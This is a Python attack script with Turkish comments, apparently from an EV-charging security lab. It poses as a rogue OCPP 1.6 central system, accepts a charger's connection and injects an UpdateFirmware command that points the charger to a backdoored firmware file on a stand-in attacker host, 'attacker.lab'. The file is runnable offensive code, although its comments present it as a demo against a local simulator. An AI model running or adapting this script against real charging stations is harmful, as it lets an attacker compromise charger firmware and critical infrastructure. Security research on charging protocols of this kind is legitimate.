"""
SALDIRI 5 - UpdateFirmware Injection (saldirgan CSMS pozisyonu).

Bu script kucuk bir 'sahte CSMS donus operatoru'. Bir EVSE'nin baglandigi
ws baglantisina UpdateFirmware mesaji enjekte eder. rogue_csms.py'nin uzun
calistirma turunden farkli olarak, bu calsi sadece UpdateFirmware'i tetikleyip
gosterir, EVSE'nin nasil tepki verdigini loglar.

Iki kullanim modu:

  (a) Sahte CSMS olarak EVSE'yi karsila + tek mesaj firmware:
      python attacks/firmware_inject.py --port 8600

      # ardindan:
      python evse-sim/charge_point.py \
          --csms ws://localhost:8600/CentralSystemService --cp-id EVSE-001

  (b) URL sadece goster (placeholder rebrand):
      python attacks/firmware_inject.py --url-only

Beklenen sonuc: EVSE charge_point.py log'lari iceren:
    <- UpdateFirmware ! location=http://attacker.lab/payload/...
    NOT: bu URL'den firmware indirilip kuruluyor olsaydi, RCE vektoru burada.
"""
import argparse
import asyncio
import logging
from datetime import datetime, timezone

import websockets

from ocpp.routing import on
from ocpp.v16 import ChargePoint as Cp
from ocpp.v16 import call, call_result
from ocpp.v16.enums import Action, RegistrationStatus

logging.basicConfig(level=logging.INFO, format="%(asctime)s [fw-inject] %(message)s", datefmt="%H:%M:%S")
log = logging.getLogger("fw")

ROGUE_URL = "http://attacker.lab/payload/backdoored-firmware-v9.9.9.bin"


class CS(Cp):
    @on(Action.boot_notification)
    async def on_boot(self, **kwargs):
        log.warning("EVSE Boot geldi: %s", kwargs)
        return call_result.BootNotification(
            current_time=datetime.now(timezone.utc).isoformat(timespec="seconds"),
            interval=30, status=RegistrationStatus.accepted,
        )

    @on(Action.heartbeat)
    async def on_hb(self):
        return call_result.Heartbeat(current_time=datetime.now(timezone.utc).isoformat(timespec="seconds"))

    @on(Action.status_notification)
    async def on_status(self, **k):
        return call_result.StatusNotification()


async def handler(ws):
    path = ws.request.path if hasattr(ws, "request") else getattr(ws, "path", "")
    cp_id = path.rstrip("/").split("/")[-1]
    log.warning("baglandi: %s", cp_id)
    cs = CS(cp_id, ws)

    async def push_firmware():
        await asyncio.sleep(3)
        log.error("ENJEKSIYON: UpdateFirmware -> %s", ROGUE_URL)
        await cs.call(call.UpdateFirmware(
            location=ROGUE_URL,
            retrieve_date=datetime.now(timezone.utc).isoformat(timespec="seconds"),
        ))
        log.error("ENJEKSIYON tamamlandi. (Gercek dunyada EVSE bu URL'i indirip kurardi.)")

    asyncio.create_task(push_firmware())
    await cs.start()


async def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, default=8600)
    ap.add_argument("--url-only", action="store_true")
    args = ap.parse_args()

    if args.url_only:
        log.warning("ROGUE_URL: %s", ROGUE_URL)
        return

    log.warning("Sahte CSMS dinliyor ws://0.0.0.0:%d/CentralSystemService/<cp>", args.port)
    async with websockets.serve(handler, "0.0.0.0", args.port, subprotocols=["ocpp1.6"]):
        await asyncio.Future()


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
